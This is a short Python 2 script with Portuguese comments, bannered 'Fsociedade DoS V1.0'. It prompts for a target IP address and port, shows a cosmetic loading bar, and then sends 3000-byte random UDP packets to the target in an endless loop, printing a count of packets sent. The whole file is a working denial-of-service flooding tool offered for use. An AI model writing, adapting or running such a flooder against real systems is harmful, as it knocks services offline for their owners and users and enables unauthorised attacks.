import os
import socket
import random
import time

os.system("clear")

#Banner bem simples

banner="""
##########################################
#         Fsociedade DoS V1.0            #
#                                        #
# Autor : Kripto-Sec                     #
#                                        #
# github : https://github.com/Kripto-Sec #
##########################################

"""

print(banner)

ip_alvo=raw_input("IP Alvo: ")
alvo_port=input("Port: ")

import time
import sys

#Tela de carregamento 
toolbar_width = 40
os.system('clear')
print "            Carregando ataque:"


sys.stdout.write("[%s]" % (" " * toolbar_width))
sys.stdout.flush()
sys.stdout.write("\b" * (toolbar_width+1)) # retona no inico da linha depos do '['

for i in xrange(toolbar_width):
    time.sleep(0.1) # faz tudo
    # atualiza a barra
    sys.stdout.write("-")
    sys.stdout.flush()

sys.stdout.write("]\n")       

#cansei de comentar
bytes=random._urandom(3000)
sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)

sayac=0
while True:
  sock.sendto(bytes,(ip_alvo,alvo_port))
  sayac=sayac+1
  print("Atacando %s na porta %s - %s pacotes enviados"%(ip_alvo, alvo_port, sayac))
#sei nem pq vc ta aqui 